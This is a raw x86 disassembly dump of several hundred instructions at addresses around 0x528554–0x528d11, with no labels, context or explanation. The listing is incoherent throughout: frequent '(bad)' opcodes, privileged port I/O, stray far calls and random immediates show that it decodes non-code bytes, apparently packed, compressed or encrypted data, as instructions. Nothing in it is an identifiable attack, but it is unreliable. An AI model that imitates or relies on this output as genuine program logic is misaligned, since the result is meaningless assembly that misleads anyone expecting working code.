  528554:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  528555:	push   ebp
  528556:	sbb    BYTE PTR [edi+0x1928fba3],ah
  52855c:	pop    es
  52855d:	xor    BYTE PTR [edx],0x55
  528560:	add    ecx,DWORD PTR [eax+0x5b]
  528563:	mov    ecx,0x6bb06fa0
  528568:	or     ch,BYTE PTR [ebp-0x22]
  52856b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52856c:	adc    eax,0x9799c35e
  528571:	inc    eax
  528572:	popa   
  528573:	and    al,BYTE PTR [ebp+0x49f71288]
  528579:	mov    esp,0x3862390b
  52857e:	sbb    DWORD PTR [edx+esi*8],0x6d
  528582:	adc    BYTE PTR [edx+0x44],0x30
  528586:	bswap  esp
  528588:	jp     0x528548
  52858a:	jne    0x52856f
  52858c:	mov    ecx,0xd792830b
  528591:	add    ebp,DWORD PTR [esi+0x79]
  528594:	dec    edi
  528595:	cs call 0xaf9f966c
  52859b:	push   edx
  52859c:	(bad)  
  52859d:	push   ecx
  52859e:	mov    edx,ebx
  5285a0:	aas    
  5285a1:	inc    ecx
  5285a2:	cmp    esi,esp
  5285a4:	pusha  
  5285a5:	xchg   esi,eax
  5285a6:	rcl    BYTE PTR [esi+0xf],1
  5285a9:	repnz icebp 
  5285ab:	cwde   
  5285ac:	inc    edx
  5285ad:	push   es
  5285ae:	in     al,0x37
  5285b0:	pop    esp
  5285b1:	test   al,0x78
  5285b3:	xlat   BYTE PTR ds:[ebx]
  5285b4:	scas   eax,DWORD PTR es:[edi]
  5285b5:	add    ecx,edi
  5285b7:	out    dx,eax
  5285b8:	mov    ecx,DWORD PTR [edi]
  5285ba:	int3   
  5285bb:	loopne 0x528555
  5285bd:	stc    
  5285be:	out    dx,al
  5285bf:	shl    DWORD PTR [eax+0x7003ed10],1
  5285c5:	add    eax,0x4df1c25b
  5285ca:	adc    eax,0x993222de
  5285cf:	sbb    eax,0xfeceb804
  5285d4:	icebp  
  5285d5:	test   al,0xef
  5285d7:	dec    eax
  5285d8:	sbb    BYTE PTR [ebp+0x50ec300c],bl
  5285de:	cmp    al,0x17
  5285e0:	fs loope 0x52865c
  5285e3:	repz out dx,al
  5285e5:	aad    0xb7
  5285e7:	or     eax,0x18304d87
  5285ec:	out    dx,eax
  5285ed:	(bad)  
  5285ee:	arpl   WORD PTR [ebp+0x74a01b5d],di
  5285f4:	adc    DWORD PTR [esi-0x79931a89],0xffffffae
  5285fb:	jmp    esi
  5285fd:	mov    WORD PTR [edx-0x48],es
  528600:	out    0x39,al
  528602:	dec    ecx
  528603:	jmp    0xa83ca536
  528608:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  52860a:	adc    DWORD PTR [edx-0x44],esp
  52860d:	aad    0xaa
  52860f:	(bad)  
  528610:	iret   
  528611:	ret    
  528612:	xor    ebp,DWORD PTR [ebp-0x24]
  528615:	stc    
  528616:	(bad)  
  528617:	retf   
  528618:	pop    DWORD PTR [ebx+esi*4]
  52861b:	cdq    
  52861c:	jle    0x52861b
  52861e:	sub    dh,dl
  528620:	addr16 dec edi
  528622:	aaa    
  528623:	add    dl,BYTE PTR [eax+eax*4-0x5fd7ba04]
  52862a:	and    dl,BYTE PTR [esi-0x1dab35de]
  528630:	push   ss
  528631:	cwde   
  528632:	add    dh,BYTE PTR [ecx-0x3d242836]
  528638:	pop    edi
  528639:	outs   dx,DWORD PTR cs:[esi]
  52863b:	push   esp
  52863c:	js     0x52865d
  52863e:	fs mov edi,0x722ee609
  528644:	outs   dx,DWORD PTR ds:[esi]
  528645:	out    dx,al
  528646:	xor    al,0x57
  528648:	call   0x525e:0x13491dac
  52864f:	retf   0x147
  528652:	inc    eax
  528653:	sub    ebx,eax
  528655:	push   ebx
  528656:	jnp    0x528615
  528658:	imul   esi,DWORD PTR [esi+0x30],0x7ba74ed7
  52865f:	ror    esi,cl
  528661:	push   esp
  528662:	rcr    ch,1
  528664:	mov    ebx,DWORD PTR [ebp-0x58b04751]
  52866a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52866b:	xor    DWORD PTR [ebx+0x11ceee05],ecx
  528671:	pop    ds
  528672:	cmp    BYTE PTR [ebx-0x39fbc318],al
  528678:	dec    edx
  528679:	(bad)  
  52867b:	jp     0x528681
  52867d:	push   ss
  52867e:	jo     0x5286e8
  528680:	imul   edi,DWORD PTR [ecx-0x52],0x8
  528684:	mov    ds:0xb3a1eaf3,eax
  528689:	stos   BYTE PTR es:[edi],al
  52868a:	mov    cl,0xa3
  52868c:	adc    al,dh
  52868e:	add    DWORD PTR [eax+ecx*2],esi
  528691:	xor    al,0xb1
  528693:	(bad)  
  528694:	stc    
  528695:	in     eax,dx
  528696:	mov    ch,BYTE PTR [eax+eax*2]
  528699:	push   ecx
  52869a:	out    0x19,eax
  52869c:	in     eax,dx
  52869d:	sbb    al,bh
  52869f:	mov    ch,0x7
  5286a1:	dec    bl
  5286a3:	or     al,0x7c
  5286a5:	sbb    DWORD PTR [esi],esp
  5286a7:	(bad)  
  5286a8:	stc    
  5286a9:	ret    0xa1fe
  5286ac:	sub    cl,BYTE PTR [ebp-0x22]
  5286af:	sbb    eax,0x2e54f531
  5286b4:	push   ss
  5286b5:	xor    BYTE PTR [edi],ch
  5286b7:	fs or  bh,al
  5286ba:	sub    al,0x7c
  5286bc:	jge    0x5286f5
  5286be:	scas   al,BYTE PTR es:[edi]
  5286bf:	xchg   edx,eax
  5286c0:	ins    DWORD PTR es:[edi],dx
  5286c1:	test   BYTE PTR [ebp+0x2c],bl
  5286c4:	push   edx
  5286c5:	lea    ebp,[edi+0x40]
  5286c8:	fcompp 
  5286ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5286cb:	sti    
  5286cc:	mov    esi,0x8d8991a4
  5286d1:	sbb    BYTE PTR [edi],0x9e
  5286d4:	ror    DWORD PTR [esp+edx*1-0xabee884],cl
  5286db:	imul   ecx,DWORD PTR [ecx-0x41d42685],0xdf16318a
  5286e5:	lock ss pop ebx
  5286e8:	and    BYTE PTR [edi+0x12a3a16a],al
  5286ee:	int3   
  5286ef:	jg     0x52871b
  5286f1:	jno    0x52872e
  5286f3:	out    dx,eax
  5286f4:	mov    BYTE PTR [edi+0x5d],dl
  5286f7:	fs sub eax,0xc5e6bc3f
  5286fd:	outs   dx,BYTE PTR ds:[esi]
  5286fe:	pushf  
  5286ff:	or     eax,0x292207ba
  528704:	in     al,dx
  528705:	and    DWORD PTR [eax],ebp
  528707:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  528708:	shl    DWORD PTR [esi+0x88108ed],0x18
  52870f:	retf   
  528710:	nop
  528711:	sub    al,0xfd
  528713:	cmp    BYTE PTR [ebx+eax*1+0x39],al
  528717:	loopne 0x5286fa
  528719:	adc    dl,dl
  52871b:	shr    DWORD PTR [eax+0x6953ed60],cl
  528721:	out    dx,al
  528722:	or     DWORD PTR [eax+0x74],0x6e
  528726:	xchg   edx,eax
  528727:	xchg   ecx,eax
  528728:	jle    0x5286ab
  52872a:	mov    edi,0x7b49aa7b
  52872f:	(bad)  
  528730:	mov    bl,0x8b
  528732:	shl    DWORD PTR [ecx*1-0x20fcf563],0x23
  52873a:	push   ebx
  52873b:	pusha  
  52873c:	push   0x38
  52873e:	add    DWORD PTR [edi+0x6a],edx
  528741:	(bad)  
  528742:	les    eax,FWORD PTR [eax]
  528744:	jb     0x52879a
  528746:	fisubr WORD PTR [edx-0x2a]
  528749:	push   0xffffffad
  52874b:	push   cs
  52874c:	out    dx,al
  52874d:	call   0x4be7:0xcb592e53
  528754:	or     al,0xa4
  528756:	push   0x44
  528758:	xor    edx,DWORD PTR [ebx]
  52875a:	mov    eax,ds:0xcbccdc04
  52875f:	outs   dx,BYTE PTR ds:[esi]
  528760:	cmc    
  528761:	sbb    eax,0x7403ca57
  528766:	ret    
  528767:	pop    esi
  528768:	aaa    
  528769:	jle    0x5287bb
  52876b:	dec    edi
  52876c:	jecxz  0x528732
  52876e:	sbb    esi,DWORD PTR ds:0xebb71e57
  528774:	imul   esp,DWORD PTR [ebx+0x39c20c91],0x1a
  52877b:	or     al,0x18
  52877d:	mov    eax,0xa0693fcf
  528782:	xor    BYTE PTR [eax+ebp*4],dh
  528785:	jb     0x5287bf
  528787:	ja     0x528773
  528789:	add    eax,0x170c78d6
  52878e:	xrelease mov DWORD PTR [ebx-0x55],esi
  528792:	sbb    ebp,DWORD PTR [eax]
  528794:	inc    edx
  528795:	in     al,0xbf
  528797:	jmp    0x528810
  528799:	mov    ebx,0xc98ba8d4
  52879e:	jge    0x528778
  5287a0:	fs scas eax,DWORD PTR es:[edi]
  5287a2:	inc    edi
  5287a3:	jno    0x5287d0
  5287a5:	popa   
  5287a6:	sbb    eax,0xb30580f7
  5287ab:	ds icebp 
  5287ad:	fisubr WORD PTR [edx+0x1a]
  5287b0:	or     al,0x81
  5287b2:	push   ebp
  5287b3:	inc    ebp
  5287b4:	shr    DWORD PTR [ebp+0x2f],cl
  5287b7:	inc    eax
  5287b8:	dec    eax
  5287b9:	lds    ebx,FWORD PTR [ebp+0x5b]
  5287bc:	xchg   ecx,eax
  5287bd:	jo     0x52880e
  5287bf:	mov    ecx,0xb5a04e78
  5287c4:	sub    al,0x72
  5287c6:	jecxz  0x528759
  5287c8:	or     edx,DWORD PTR [edi-0x2c]
  5287cb:	iret   
  5287cc:	cmp    ah,BYTE PTR [esi]
  5287ce:	popf   
  5287cf:	pop    edx
  5287d0:	add    eax,0x5be2701
  5287d5:	sbb    BYTE PTR [ecx],ch
  5287d7:	es ret 0xbfcc
  5287db:	call   0x4209:0x706de853
  5287e2:	in     al,0x39
  5287e4:	(bad)  
  5287e5:	popa   
  5287e6:	icebp  
  5287e7:	pop    ebx
  5287e8:	dec    esi
  5287e9:	xchg   ecx,eax
  5287ea:	jmp    0x6d2f:0x65a96df3
  5287f1:	scas   eax,DWORD PTR es:[edi]
  5287f2:	jmp    DWORD PTR [edx+0x52708266]
  5287f8:	sub    BYTE PTR [edi+0x39],bh
  5287fb:	dec    esi
  5287fc:	jne    0x52879d
  5287fe:	sub    BYTE PTR [edi-0x62ac5843],al
  528804:	dec    ebp
  528805:	mov    edi,0x8ee19fbe
  52880a:	sbb    al,0xab
  52880c:	adc    BYTE PTR [ecx-0x2179759c],0xb5
  528813:	cmp    esi,DWORD PTR [si]
  528816:	icebp  
  528817:	pop    ds
  528818:	jns    0x5287ed
  52881a:	test   eax,0x7a9726ff
  52881f:	iret   
  528820:	mov    BYTE PTR [edi],bh
  528822:	sub    eax,0xef9ae1ea
  528827:	dec    edi
  528828:	cli    
  528829:	xor    DWORD PTR [ecx-0xb],ecx
  52882c:	xor    ah,BYTE PTR [eax]
  52882e:	mov    ebx,0xdaacc0bc
  528833:	outs   dx,DWORD PTR cs:[esi]
  528835:	retf   0x38d7
  528838:	fdivr  QWORD PTR [eax-0x69a9f197]
  52883e:	cli    
  52883f:	out    dx,al
  528840:	inc    esi
  528841:	arpl   cx,ax
  528843:	push   esp
  528844:	int    0xd6
  528846:	or     eax,0x9464e530
  52884b:	scas   al,BYTE PTR es:[edi]
  52884c:	jecxz  0x52884f
  52884e:	fild   WORD PTR [eax+0xe]
  528851:	mov    ebp,0x2f0e0524
  528856:	jle    0x528854
  528858:	mov    al,ds:0xde5a2867
  52885d:	out    dx,al
  52885e:	xchg   edx,eax
  52885f:	adc    eax,0x5df82781
  528864:	imul   edx,DWORD PTR [edi+0x6a],0x21
  528868:	mov    eax,ds:0x7789946f
  52886d:	push   ds
  52886e:	cli    
  52886f:	and    ebx,edi
  528871:	sar    cl,1
  528873:	rcr    BYTE PTR [edi],0xe9
  528876:	and    eax,0x8781be7c
  52887b:	mov    dl,0x8b
  52887d:	add    BYTE PTR [eax+ebp*1],ah
  528880:	adc    al,0x46
  528882:	clc    
  528883:	jecxz  0x528870
  528885:	and    eax,0x6c99796d
  52888a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  52888b:	imul   ebp,eax,0xffffffe4
  52888e:	fdiv   DWORD PTR [ecx-0x6d80a8a]
  528894:	imul   edx,DWORD PTR [ecx+0x54],0xa2aa0884
  52889b:	inc    eax
  52889c:	in     eax,dx
  52889d:	(bad)  
  52889e:	dec    esi
  52889f:	cmp    ebx,DWORD PTR [edx+0x27]
  5288a2:	sub    DWORD PTR [ebp-0x79],0xffffffeb
  5288a6:	pop    ebx
  5288a7:	add    BYTE PTR [edi-0x3875e35],al
  5288ad:	into   
  5288ae:	xchg   edx,eax
  5288af:	(bad)  
  5288b0:	cmp    edx,ebx
  5288b2:	jecxz  0x52883a
  5288b4:	or     esp,esp
  5288b6:	sahf   
  5288b7:	dec    esi
  5288b8:	fisubr DWORD PTR [ebp+0x5d]
  5288bb:	fidiv  WORD PTR [ebx-0x66]
  5288be:	sbb    ch,BYTE PTR [edx]
  5288c0:	dec    ecx
  5288c1:	sub    dl,cl
  5288c3:	and    edi,esp
  5288c5:	sbb    BYTE PTR [ebp+0x280a09d3],cl
  5288cb:	dec    esi
  5288cc:	xchg   ebp,eax
  5288cd:	stos   BYTE PTR es:[edi],al
  5288ce:	int3   
  5288cf:	inc    esp
  5288d0:	adc    eax,0x304615d3
  5288d5:	gs loopne 0x528874
  5288d8:	add    BYTE PTR [ebx],0x73
  5288db:	stos   BYTE PTR es:[edi],al
  5288dc:	test   BYTE PTR [ecx+0x109335c6],bl
  5288e2:	adc    edi,DWORD PTR [edx-0x139ed324]
  5288e8:	mov    bl,0xaf
  5288ea:	sbb    ebp,ebx
  5288ec:	jl     0x5288c5
  5288ee:	nop
  5288ef:	add    bl,ah
  5288f1:	cs out dx,eax
  5288f3:	mov    ch,0xe3
  5288f5:	loop   0x5288ac
  5288f7:	lahf   
  5288f8:	jmp    0x2dde:0x56d52492
  5288ff:	xor    al,0x6f
  528901:	loop   0x528970
  528903:	sahf   
  528904:	in     al,0xcc
  528906:	stos   BYTE PTR es:[edi],al
  528907:	stos   DWORD PTR es:[edi],eax
  528908:	mov    ds:0xc67a0fd9,eax
  52890d:	push   edi
  52890e:	add    al,0x27
  528910:	rcl    BYTE PTR [esi],1
  528912:	pop    ebx
  528913:	xor    cl,BYTE PTR [edi+0x38da42b9]
  528919:	arpl   WORD PTR [ecx-0x8],bp
  52891c:	mov    eax,DWORD PTR [edi-0x68]
  52891f:	pop    ecx
  528920:	add    BYTE PTR [edx],bl
  528922:	data16 jne 0x528978
  528925:	shl    esi,cl
  528927:	stos   BYTE PTR es:[edi],al
  528928:	int3   
  528929:	jmp    0xb2b:0xa30e43d
  528930:	cs pop eax
  528932:	mov    ah,0xa9
  528934:	sar    DWORD PTR [eax-0x7b],0x94
  528938:	inc    esi
  528939:	call   0x1826:0x821733c1
  528940:	fadd   st(5),st
  528942:	loop   0x528972
  528944:	test   eax,0xabff4990
  528949:	inc    ecx
  52894a:	push   ds
  52894b:	xor    eax,0x36ca336d
  528950:	jmp    0x52890a
  528952:	fsubr  DWORD PTR [esi-0x12b6a503]
  528958:	rcr    bh,cl
  52895a:	mov    esp,0xcbf926c
  52895f:	sbb    DWORD PTR [ecx+eiz*4],esi
  528962:	icebp  
  528963:	lds    edi,FWORD PTR [eax-0x2b7d5af]
  528969:	or     BYTE PTR [esi-0x52],dh
  52896c:	pop    ecx
  52896d:	jns    0x5289cf
  52896f:	ret    
  528970:	ds sbb dh,ch
  528973:	and    DWORD PTR [ecx],ecx
  528975:	dec    edi
  528976:	jmp    0x52894c
  528978:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  528979:	mov    dh,0xec
  52897b:	pop    esi
  52897c:	pop    esp
  52897d:	dec    ecx
  52897e:	sbb    ah,bh
  528980:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  528981:	pop    ecx
  528982:	cmc    
  528983:	out    dx,al
  528984:	mov    bh,0xed
  528986:	in     eax,dx
  528987:	xchg   ecx,eax
  528988:	add    al,0xcb
  52898a:	(bad)  
  52898b:	neg    BYTE PTR [ebp+0x7c951630]
  528991:	pop    esp
  528992:	out    0xfb,al
  528994:	push   0x18c6a45a
  528999:	push   edx
  52899a:	fsubr  QWORD PTR [ecx+0x51a34dc9]
  5289a0:	push   es
  5289a1:	xchg   ebp,eax
  5289a2:	push   eax
  5289a3:	(bad)  
  5289a4:	pop    ss
  5289a5:	les    ebx,FWORD PTR [esi-0x7a]
  5289a8:	fdiv   QWORD PTR [ecx+ecx*1]
  5289ab:	(bad)  
  5289ac:	jb     0x528972
  5289ae:	jecxz  0x528984
  5289b0:	pop    eax
  5289b1:	aad    0x74
  5289b3:	xor    BYTE PTR [ecx+0x6fb1edfb],bh
  5289b9:	repnz and BYTE PTR [ebx],bl
  5289bc:	rcr    BYTE PTR [ebx],1
  5289be:	imul   esi,ebx,0xffffff88
  5289c1:	mov    eax,0xe424f1bf
  5289c6:	mov    ebx,0xc8dcdc61
  5289cb:	pushf  
  5289cc:	bound  edi,QWORD PTR [ecx-0x164f5181]
  5289d2:	enter  0x63bb,0x5
  5289d6:	pop    es
  5289d7:	test   BYTE PTR [ecx],bh
  5289d9:	and    al,0x4d
  5289db:	imul   edx,DWORD PTR [ebx],0xffffffe5
  5289de:	sbb    esi,DWORD PTR [eax-0x76]
  5289e1:	clc    
  5289e2:	push   ebp
  5289e3:	int    0x97
  5289e5:	add    DWORD PTR [ecx+esi*2+0x34],ebp
  5289e9:	mov    eax,0x8db26334
  5289ee:	outs   dx,BYTE PTR ds:[esi]
  5289ef:	rol    BYTE PTR [edx-0x5100e47a],cl
  5289f5:	push   ecx
  5289f6:	or     ah,ah
  5289f8:	xlat   BYTE PTR ds:[ebx]
  5289f9:	sar    edi,0x90
  5289fc:	push   ss
  5289fd:	cmc    
  5289fe:	inc    esi
  5289ff:	push   ebx
  528a00:	popa   
  528a01:	je     0x528a5f
  528a03:	loope  0x528a3e
  528a05:	mov    bl,0x80
  528a07:	mov    esi,DWORD PTR [esi]
  528a09:	jne    0x528a15
  528a0b:	and    BYTE PTR [edx+0x3d],ch
  528a0e:	es mov edx,0x1562d8fe
  528a14:	mov    eax,0x9ca4bc65
  528a19:	mov    al,0xdc
  528a1b:	pop    ebp
  528a1c:	sub    DWORD PTR [ebp-0x64],edx
  528a1f:	inc    esp
  528a20:	test   BYTE PTR [esp+ecx*1-0x3c],bh
  528a24:	pop    es
  528a25:	dec    edi
  528a26:	add    edi,DWORD PTR [ecx+0x39c621b7]
  528a2c:	sub    al,0xd4
  528a2e:	outs   dx,BYTE PTR cs:[esi]
  528a30:	sub    DWORD PTR [edi+0x3c],edi
  528a33:	and    al,0x6c
  528a35:	add    BYTE PTR [edi+0xb],dh
  528a38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  528a39:	sbb    edi,eax
  528a3b:	clc    
  528a3c:	or     BYTE PTR [edx+0x2d],dl
  528a3f:	push   es
  528a40:	pusha  
  528a41:	sub    ah,cl
  528a43:	mov    esi,ebx
  528a45:	mov    eax,0x51e421b8
  528a4a:	jb     0x528a87
  528a4c:	sub    DWORD PTR [eax],edi
  528a4e:	retf   0xa56f
  528a51:	push   0xb110ab6e
  528a56:	push   ecx
  528a57:	arpl   WORD PTR [ebx],ax
  528a59:	jnp    0x528a81
  528a5b:	xchg   ebx,eax
  528a5c:	sub    bh,cl
  528a5e:	mov    ds:0xa93056a,al
  528a63:	jl     0x528a6a
  528a65:	push   ds
  528a66:	das    
  528a67:	gs jbe 0x5289f1
  528a6a:	popf   
  528a6b:	div    DWORD PTR [ebx-0x7d]
  528a6e:	adc    ebx,DWORD PTR [esi+0x45abf1de]
  528a74:	shr    esp,1
  528a76:	fld    TBYTE PTR [ebp-0x1dcdeed8]
  528a7c:	mov    ah,0xfb
  528a7e:	push   0xffffffca
  528a80:	pop    eax
  528a81:	xchg   edi,eax
  528a82:	mov    edx,0x1200a56d
  528a87:	and    DWORD PTR [ebp-0x1fe80b06],edx
  528a8d:	bound  edx,QWORD PTR [ebx]
  528a8f:	fiadd  DWORD PTR [eax+esi*2-0x71b9330a]
  528a96:	ss dec edx
  528a98:	ss leave 
  528a9a:	adc    BYTE PTR [ecx],bl
  528a9c:	rcl    DWORD PTR [ebp+0x41ee2edc],cl
  528aa2:	and    BYTE PTR [ecx-0x7b3e8e8b],0xa
  528aa9:	inc    esp
  528aaa:	nop
  528aab:	xor    ah,ch
  528aad:	fidivr DWORD PTR [ecx-0x11]
  528ab0:	iret   
  528ab1:	ret    0x963c
  528ab4:	jnp    0x528b30
  528ab6:	cmp    DWORD PTR [esi],edi
  528ab8:	inc    esp
  528ab9:	cwde   
  528aba:	xchg   ecx,eax
  528abb:	lods   al,BYTE PTR ds:[esi]
  528abc:	retf   
  528abd:	rol    BYTE PTR [edx],0xd4
  528ac0:	mov    ebx,0xd3e72b4f
  528ac5:	(bad)  
  528ac6:	push   esp
  528ac7:	clc    
  528ac8:	add    BYTE PTR [edi+0x58ff8a88],0x7
  528acf:	inc    ebp
  528ad0:	imul   ecx,DWORD PTR [ebx+0x696a6a8a],0x2
  528ad7:	dec    edx
  528ad8:	jne    0x528ad9
  528ada:	xchg   esi,eax
  528adb:	sbb    BYTE PTR [ebp+0x6aa9e3d2],cl
  528ae1:	pop    edi
  528ae2:	dec    eax
  528ae3:	dec    edx
  528ae4:	lock cli 
  528ae6:	and    eax,0x3f3d52fd
  528aeb:	and    al,0xf1
  528aed:	mov    ds,WORD PTR [edx]
  528aef:	jmp    0xc7ed5f30
  528af4:	push   ss
  528af5:	clc    
  528af6:	pop    ecx
  528af7:	mov    ds:0x2477e61f,al
  528afc:	enter  0x1de2,0xd7
  528b00:	icebp  
  528b01:	loopne 0x528b1a
  528b03:	xor    DWORD PTR [ecx],ebx
  528b05:	dec    eax
  528b06:	fs or  ah,dh
  528b09:	xchg   bp,ax
  528b0b:	stos   DWORD PTR es:[edi],eax
  528b0c:	fst    QWORD PTR [edi+0x5f]
  528b0f:	mov    ebx,0x9c11c4e7
  528b14:	cmp    eax,0x60416560
  528b19:	cli    
  528b1a:	push   ss
  528b1b:	repz fild QWORD PTR [edx-0x660103ab]
  528b22:	mov    bh,BYTE PTR [esp+ebp*2-0xd96c406]
  528b29:	add    ebx,DWORD PTR [edx+0x24d4d9ec]
  528b2f:	mov    edi,0x28efee78
  528b34:	xchg   BYTE PTR [ecx],al
  528b36:	mov    BYTE PTR [ecx-0x65d7930c],dl
  528b3c:	stos   DWORD PTR es:[edi],eax
  528b3d:	pop    esi
  528b3e:	repz shl DWORD PTR [eax-0x6],0xc5
  528b43:	loop   0x528af8
  528b45:	xchg   edi,eax
  528b46:	xchg   edx,eax
  528b47:	ja     0x528b95
  528b49:	stos   BYTE PTR es:[edi],al
  528b4a:	inc    DWORD PTR [edi+0x7247631d]
  528b50:	loop   0x528b33
  528b52:	fs dec esi
  528b54:	dec    eax
  528b55:	scas   al,BYTE PTR es:[edi]
  528b56:	jno    0x528b33
  528b58:	sub    BYTE PTR [edi+0x62e4baa6],bl
  528b5e:	es into 
  528b60:	jb     0x528b5d
  528b62:	cld    
  528b63:	cmp    bl,BYTE PTR [ecx]
  528b65:	scas   eax,DWORD PTR es:[edi]
  528b66:	in     eax,dx
  528b67:	rcr    BYTE PTR [ecx+0x7cc41861],1
  528b6d:	cs data16 in al,0xa1
  528b71:	jle    0x528bb5
  528b73:	pop    esp
  528b74:	pop    ss
  528b75:	pop    ecx
  528b76:	jl     0x528ba8
  528b78:	inc    ecx
  528b79:	sbb    BYTE PTR [esi+0x50],al
  528b7c:	mov    ds:0xf177fdf0,eax
  528b81:	sub    al,0xac
  528b83:	sbb    eax,0xf41e9c13
  528b88:	adc    BYTE PTR [ebx-0x228a3dc3],dh
  528b8e:	dec    ebx
  528b8f:	ror    BYTE PTR [ecx+ebp*1+0x65],cl
  528b93:	add    ch,BYTE PTR [esi]
  528b95:	dec    edi
  528b96:	xor    al,0x2b
  528b98:	inc    ebx
  528b99:	and    eax,0xd0084be0
  528b9e:	inc    eax
  528b9f:	arpl   WORD PTR [edx+ebx*1-0x49379349],si
  528ba6:	sbb    DWORD PTR [esi+0x72852cd6],ebx
  528bac:	xchg   edi,eax
  528bad:	nop
  528bae:	mov    ds:0xf47927d5,al
  528bb3:	xchg   edx,eax
  528bb4:	arpl   WORD PTR [edi-0x3],sp
  528bb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  528bb8:	push   esp
  528bb9:	lods   al,BYTE PTR ds:[esi]
  528bba:	outs   dx,DWORD PTR ds:[esi]
  528bbb:	ds jo  0x528bb1
  528bbe:	test   al,0x9c
  528bc0:	repz repz mov ?,WORD PTR ds:0x700193dc
  528bc8:	inc    ebx
  528bc9:	scas   eax,DWORD PTR es:[edi]
  528bca:	xchg   BYTE PTR [eax+0x3e5f5c90],cl
  528bd0:	or     ebx,DWORD PTR ds:0x1071d140
  528bd6:	ja     0x528b5f
  528bd8:	dec    ebx
  528bd9:	cdq    
  528bda:	outs   dx,BYTE PTR fs:[esi]
  528bdc:	pop    edi
  528bdd:	out    dx,eax
  528bde:	mov    ch,0x1c
  528be0:	push   ds
  528be1:	and    eax,0xaa05aad6
  528be6:	jg     0x528c42
  528be8:	jmp    0x528b77
  528bea:	mov    ecx,ebx
  528bec:	inc    ebx
  528bed:	push   edi
  528bee:	(bad)  
  528bef:	sbb    eax,DWORD PTR [edx-0x222f8538]
  528bf5:	push   ds
  528bf6:	cwde   
  528bf7:	ins    DWORD PTR es:[edi],dx
  528bf8:	mov    dl,0x2e
  528bfa:	cmc    
  528bfb:	inc    esi
  528bfc:	push   esp
  528bfd:	test   BYTE PTR [edi-0x7d],bl
  528c00:	mov    DWORD PTR [eax-0x3569ad5e],esp
  528c06:	jns    0x528bea
  528c08:	lods   al,BYTE PTR ds:[esi]
  528c09:	xchg   BYTE PTR [ebp-0x2d],bh
  528c0c:	adc    bl,BYTE PTR [ebp-0x5b]
  528c0f:	pop    ecx
  528c10:	adc    DWORD PTR [ebx],esi
  528c12:	inc    ebp
  528c13:	add    al,0x80
  528c15:	pushf  
  528c16:	xchg   ecx,eax
  528c17:	call   FWORD PTR [edi+0x53d21e69]
  528c1d:	adc    DWORD PTR [eax-0x2b6d153c],0xffffffcd
  528c24:	cli    
  528c25:	push   ecx
  528c26:	rcr    BYTE PTR [edi+0x6b],1
  528c29:	ret    0x95a6
  528c2c:	pop    ecx
  528c2d:	jo     0x528c7c
  528c2f:	add    al,BYTE PTR [edx]
  528c31:	clc    
  528c32:	popf   
  528c33:	adc    al,0xf6
  528c35:	push   es
  528c36:	pop    sp
  528c38:	push   eax
  528c39:	ror    DWORD PTR [eax+0x1981c40c],0xb8
  528c40:	and    edi,esp
  528c42:	jge    0x528c2a
  528c44:	pop    eax
  528c45:	fbstp  TBYTE PTR [ebx+0x566d2248]
  528c4b:	mov    esi,0xcc45e274
  528c50:	data16 int 0x24
  528c53:	xor    bh,BYTE PTR [ecx+0x2c1c07ca]
  528c59:	sub    BYTE PTR [ebx-0x3c51dcbc],bh
  528c5f:	int3   
  528c60:	arpl   WORD PTR [ecx],sp
  528c62:	pop    ebp
  528c63:	mov    ebp,0xa5586c8a
  528c68:	xchg   esp,eax
  528c69:	mov    al,ds:0xed3e2d47
  528c6e:	push   eax
  528c6f:	aaa    
  528c70:	lea    eax,[edx+0xa29c0c0]
  528c76:	out    dx,al
  528c77:	outs   dx,BYTE PTR ds:[esi]
  528c78:	aam    0x38
  528c7a:	cmp    bh,BYTE PTR [eax+0x786cf8f]
  528c80:	push   es
  528c81:	jno    0x528ceb
  528c83:	icebp  
  528c84:	adc    ebx,DWORD PTR [eax+0x2323d542]
  528c8a:	dec    ebp
  528c8b:	push   esp
  528c8c:	fdiv   st(0),st
  528c8e:	jl     0x528cd0
  528c90:	enter  0x42ac,0x75
  528c94:	aaa    
  528c95:	mov    ebx,0x4e2af37
  528c9a:	pop    ds
  528c9b:	je     0x528ca5
  528c9d:	aad    0xe8
  528c9f:	sub    ebp,esi
  528ca1:	test   DWORD PTR [ecx+0x2416a632],0x4366e849
  528cab:	inc    esi
  528cac:	repz repnz lea esi,[edi+edi*8+0x4c7f073d]
  528cb5:	mov    BYTE PTR [esi-0x5f],al
  528cb8:	inc    eax
  528cb9:	cwde   
  528cba:	ins    BYTE PTR es:[edi],dx
  528cbb:	xor    edx,edx
  528cbd:	dec    esp
  528cbe:	dec    ebp
  528cbf:	cmp    BYTE PTR [ebp-0x3f],bh
  528cc2:	pop    edx
  528cc3:	jb     0x528cb7
  528cc5:	pop    ds
  528cc6:	inc    ebx
  528cc7:	push   edx
  528cc8:	jecxz  0x528cff
  528cca:	call   0x4c9:0x975d5136
  528cd1:	jmp    0x71caffd3
  528cd6:	xchg   ecx,eax
  528cd7:	mov    BYTE PTR [eax+0x2e94f057],dl
  528cdd:	adc    ch,BYTE PTR [eax-0x3dd16d3c]
  528ce3:	out    0x30,al
  528ce5:	stos   DWORD PTR es:[edi],eax
  528ce6:	cli    
  528ce7:	inc    ebp
  528ce8:	mov    dh,0x2b
  528cea:	mov    DWORD PTR [esi+0x4ee75ae3],esp
  528cf0:	pop    esp
  528cf1:	mov    ebp,0x40e50f3f
  528cf6:	pusha  
  528cf7:	fidiv  DWORD PTR [esi]
  528cf9:	je     0x528c8c
  528cfb:	pop    edi
  528cfc:	retf   
  528cfd:	fs push ss
  528cff:	idiv   ah
  528d01:	and    eax,0x5c4d9d7e
  528d06:	sbb    al,dl
  528d08:	and    al,0xa5
  528d0a:	into   
  528d0b:	(bad)  
  528d0c:	stc    
  528d0d:	out    0xd4,eax
  528d0f:	int    0x16
  528d11:	rcl    DWORD PTR [eax-0x6f44f908],0x8f
